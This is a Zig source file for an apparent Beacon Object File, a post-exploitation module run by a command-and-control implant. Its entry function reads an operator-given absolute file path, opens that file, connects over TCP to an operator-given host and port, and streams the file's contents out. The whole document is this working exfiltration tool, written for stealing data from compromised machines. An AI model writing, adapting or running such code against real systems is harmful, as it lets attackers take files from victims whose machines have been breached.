const std = @import("std");
const posix = @import("std").posix;
const bofapi = @import("bof_api");
const beacon = bofapi.beacon;

comptime {
    @import("bof_api").embedFunctionCode("memcpy");
    @import("bof_api").embedFunctionCode("memmove");
    @import("bof_api").embedFunctionCode("memset");
    @import("bof_api").embedFunctionCode("__stackprobe__");
}

// BOF-specific error codes
const BofErrors = enum(u8) {
    AccesDenied = 0x1,
    NoArgsProvided = 0x2,
    CwdUnlinked,
    NameTooLong,
    UnknownError,
};

pub export fn go(adata: ?[*]u8, alen: i32) callconv(.c) u8 {
    @import("bof_api").init(adata, alen, .{});

    if (alen == 0) {
        return @intFromEnum(BofErrors.NoArgsProvided);
    }

    const allocator = std.heap.page_allocator;

    var parser = beacon.datap{};
    beacon.dataParse(&parser, adata, alen);

    if (beacon.dataExtract(&parser, null)) |address1| {

        var iter = std.mem.splitScalar(u8, std.mem.sliceTo(address1, 0), ':');

        const file_path = iter.next() orelse return 1;
        const file = std.fs.openFileAbsolute(file_path, .{}) catch return 1;

        var recv_buffer: [4096]u8 = undefined;
        var file_r = file.reader(&recv_buffer);
        const file_r_iface = &file_r.interface;

        if (beacon.dataExtract(&parser, null)) |address2| {

            var iter2 = std.mem.splitScalar(u8, std.mem.sliceTo(address2, 0), ':');

            const host = iter2.next() orelse return 1;
            const port = std.fmt.parseUnsigned(u16, iter2.next() orelse return 1, 10) catch return 1;

            const tcp = std.net.tcpConnectToHost(allocator, host, port) catch return 1;
            defer tcp.close();

            var tcp_buf: [4096]u8 = undefined;
            var tcp_w = tcp.writer(&tcp_buf);

            _ = file_r_iface.streamRemaining(&tcp_w.interface) catch return 1;
        }
    }

    return 0;
}
